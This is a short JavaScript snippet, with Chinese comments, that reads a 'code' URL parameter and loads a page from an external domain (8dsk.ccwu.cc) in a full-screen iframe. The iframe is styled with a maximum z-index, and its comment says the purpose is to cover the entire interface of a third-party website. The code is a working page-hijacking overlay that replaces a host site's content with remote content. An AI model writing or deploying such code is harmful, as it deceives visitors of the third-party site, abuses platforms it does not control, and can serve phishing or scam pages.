(function () {
  'use strict';
  try {
    var domains = [
      '8dsk.ccwu.cc'
    ];

    var urlParams = new URLSearchParams(window.location.search);
    var code = urlParams.get('code');
    if (!code) {
      document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#f56c6c;font-size:14px;">参数错误</div>';
      return;
    }

    var idx = Math.floor(Math.random() * domains.length);
    var src = '//' + domains[idx] + '/?code=' + encodeURIComponent(code);

    // iframe 全屏覆盖：position:fixed + 最大 z-index，盖住第三方网站的所有外壳
    var iframe = document.createElement('iframe');
    iframe.src = src;
    iframe.allow = 'autoplay; fullscreen; clipboard-write';
    iframe.setAttribute('allowfullscreen', '');
    iframe.style.cssText = 'position:fixed!important;top:0!important;left:0!important;right:0!important;bottom:0!important;width:100vw!important;height:100vh!important;border:0!important;margin:0!important;padding:0!important;z-index:2147483647!important;background:#fff!important;display:block!important';

    document.documentElement.appendChild(iframe);
  } catch (e) {
    document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#f56c6c;font-size:14px;">系统错误</div>';
  }
})();
